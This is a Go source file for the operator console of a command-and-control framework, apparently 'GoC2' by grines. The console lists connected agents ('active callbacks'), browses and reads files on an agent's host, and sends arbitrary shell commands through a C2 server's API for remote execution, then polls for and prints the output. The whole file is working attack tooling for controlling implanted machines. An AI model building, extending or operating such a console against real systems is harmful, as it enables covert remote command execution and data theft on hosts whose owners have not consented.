package cli

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/chzyer/readline"
	"github.com/gookit/color"
	"github.com/lithammer/shortuuid"
)

var timeoutSetting = 1
var agent string = "Not Connected"
var c2 string

//Cmd ...
type Cmd struct {
	ID      string
	Command string
	Agent   string
	Status  string
	Cmdid   string
	Output  string
}

//Agent ...
type Agent struct {
	ID      string
	Agent   string
	Working string
	Files   string
	checkIn time.Time
}

//ListAgents ...
func ListAgents(c2 string) {
	getAgents(c2 + "/api/agents/")
}

func getAgents(url string) {

	resp, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}

	body, readErr := ioutil.ReadAll(resp.Body)
	if readErr != nil {
		log.Fatal(readErr)
	}

	var results []Agent
	jsonErr := json.Unmarshal(body, &results)
	if jsonErr != nil {
		log.Fatal(jsonErr)
	}

	for _, d := range results {
		fmt.Fprintln(os.Stderr, "Active callback: "+d.Agent)
	}
}

var wd string = ""

//Start ...
func Start(c2 string) {

	red := color.FgRed.Render
	blue := color.FgBlue.Render
	fmt.Println("Connected: " + red(c2))
	ascii := `
		┏━━━┓╋╋╋┏━━━┳━━━┓
		┃┏━┓┃╋╋╋┃┏━┓┃┏━┓┃
		┃┃╋┗╋━━┓┃┃╋┗┻┛┏┛┃
		┃┃┏━┫┏┓┃┃┃╋┏┳━┛┏┛
		┃┗┻━┃┗┛┃┃┗━┛┃┃┗━┓
		┗━━━┻━━┛┗━━━┻━━━┛ by grines`
	print(ascii + "\n")

	for {
		var completer = readline.NewPrefixCompleter(
			readline.PcItem("cd",
				readline.PcItemDynamic(listFiles(c2, agent)),
			),
			readline.PcItem("cat",
				readline.PcItemDynamic(listFiles(c2, agent)),
			),
			readline.PcItem("agent",
				readline.PcItemDynamic(listAgents(c2)),
			),
		)
		l, err := readline.NewEx(&readline.Config{
			Prompt:          "\033[31m»\033[0m ",
			HistoryFile:     "/tmp/readline.tmp",
			AutoComplete:    completer,
			InterruptPrompt: "^C",
			EOFPrompt:       "exit",

			HistorySearchFold:   true,
			FuncFilterInputRune: filterInput,
		})
		if err != nil {
			panic(err)
		}
		defer l.Close()

		log.SetOutput(l.Stderr())
		if agent != "Not Connected" {
			wd := getAgentWorking(c2 + "/api/agent/" + agent)
			l.SetPrompt(red(wd) + " <" + blue(agent) + "*> ")
		} else {
			l.SetPrompt(" <" + blue(agent) + "*> ")
		}
		line, err := l.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, "mode "):
			switch line[5:] {
			case "vi":
				l.SetVimMode(true)
			case "emacs":
				l.SetVimMode(false)
			default:
				println("invalid mode:", line[5:])
			}
		case strings.HasPrefix(line, "agent "):
			parts := strings.Split(line, " ")
			agent = parts[1]
		case line == "login":
			pswd, err := l.ReadPassword("please enter your password: ")
			if err != nil {
				break
			}
			println("you enter:", strconv.Quote(string(pswd)))
		case strings.HasPrefix(line, "setprompt"):
			if len(line) <= 10 {
				log.Println("setprompt <prompt>")
				break
			}
			l.SetPrompt(line[10:])
		case strings.HasPrefix(line, "say"):
			line := strings.TrimSpace(line[3:])
			if len(line) == 0 {
				log.Println("say what?")
				break
			}
			go func() {
				for range time.Tick(time.Second) {
					log.Println(line)
				}
			}()
		case line == "bye":
			goto exit
		case line == "sleep":
			log.Println("sleep 4 second")
			time.Sleep(4 * time.Second)
		case line == "":
		default:
			cmdString := line
			if cmdString == "exit" {
				os.Exit(1)
			}

			if strings.Contains(cmdString, "upload ") {
				fmt.Println("Upload file to remote")
				fmt.Println(cmdString)
				break
			}

			cmdid := sendCommand(cmdString, agent, c2)
			deadline := time.Now().Add(15 * time.Second)
			for {
				id, output := getOutput(c2+"/api/cmd/output/"+agent+"/"+cmdid, c2, cmdid)
				if id == cmdid && output != "" || cmdString == "" {
					fmt.Fprintln(os.Stderr, output)
					wd := getAgentWorking(c2 + "/api/agent/" + agent)
					l.SetPrompt(red(wd) + " <" + blue(agent) + "*> ")
					break
				}
				if time.Now().After(deadline) {
					fmt.Fprintln(os.Stderr, "*Timeout*")
					break
				}
			}
		}
	}
exit:
}

func listFiles(c2 string, agent string) func(string) []string {
	return func(line string) []string {
		resp, err := http.Get(c2 + "/api/agent/" + agent)
		if resp.Status == "200 OK" {

			if err != nil {
				log.Println(err)
			}
			if resp.Body != nil {
				defer resp.Body.Close()
			}

			body, readErr := ioutil.ReadAll(resp.Body)
			if readErr != nil {
				fmt.Println(readErr)
			}

			var results Agent
			jsonErr := json.Unmarshal(body, &results)
			if jsonErr != nil {
				fmt.Println(jsonErr)
			}

			names := strings.Split(results.Files, ",")
			return names
		}
		return nil
	}
}

// Function constructor - constructs new function for listing given directory
func listAgents(c2 string) func(string) []string {
	return func(line string) []string {
		resp, err := http.Get(c2 + "/api/agents")
		if resp.Status == "200 OK" {
			if err != nil {
				fmt.Println(err)
			}
			if resp.Body != nil {
				defer resp.Body.Close()
			}

			body, readErr := ioutil.ReadAll(resp.Body)
			if readErr != nil {
				fmt.Println(readErr)
			}

			var results []Agent
			jsonErr := json.Unmarshal(body, &results)
			if jsonErr != nil {
				fmt.Println(jsonErr)
			}

			names := make([]string, 0)
			for _, d := range results {
				names = append(names, d.Agent)
			}
			return names
		}
		return nil
	}
}

func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

func sendCommand(cmd string, agent string, c2 string) string {
	randid := shortuuid.New()
	resp, err := http.PostForm(c2+"/api/cmd/new",
		url.Values{"cmdid": {randid}, "cmd": {cmd}, "agent": {agent}})

	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
	return randid
}

func getOutput(url string, c2 string, cmd string) (string, string) {

	resp, err := http.Get(url)
	if resp.Status == "200 OK" {
		if err != nil {
			panic(err)
		}
		if resp.Body != nil {
			defer resp.Body.Close()
		}

		body, readErr := ioutil.ReadAll(resp.Body)
		if readErr != nil {
			log.Fatal(readErr)
		}

		var results []Cmd
		jsonErr := json.Unmarshal(body, &results)
		if jsonErr != nil {
			log.Fatal(jsonErr)
		}

		for _, d := range results {
			//fmt.Println(d.Output)
			//fmt.Fprintln(os.Stderr, d.Output)
			//updateCmdStatus(d.Cmdid, c2)
			return d.Cmdid, d.Output
			//fmt.Println(d.Cmdid + ": " + d.Output)
			//updateCmdStatus(d.Cmdid)
		}

		// Print the HTTP response status.
		//fmt.Println("Response status:", resp.Status)
		//return "True"
	}
	return "False", "False"

}

func getAgentWorking(url string) string {

	resp, err := http.Get(url)
	if resp.Status == "200 OK" {

		if err != nil {
			fmt.Println(err)
		}
		if resp.Body != nil {
			defer resp.Body.Close()
		}

		body, readErr := ioutil.ReadAll(resp.Body)
		if readErr != nil {
			log.Fatal(readErr)
		}

		var results Agent
		jsonErr := json.Unmarshal(body, &results)
		if jsonErr != nil {
			log.Fatal(jsonErr)
		}

		//fmt.Println(results.Working)

		return results.Working
	}
	return "False"

}

func updateCmdStatus(cmdid string, c2 string) {
	resp, err := http.PostForm(c2+"/api/cmd/update/output",
		url.Values{"id": {cmdid}, "client_status": {"1"}})

	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
}
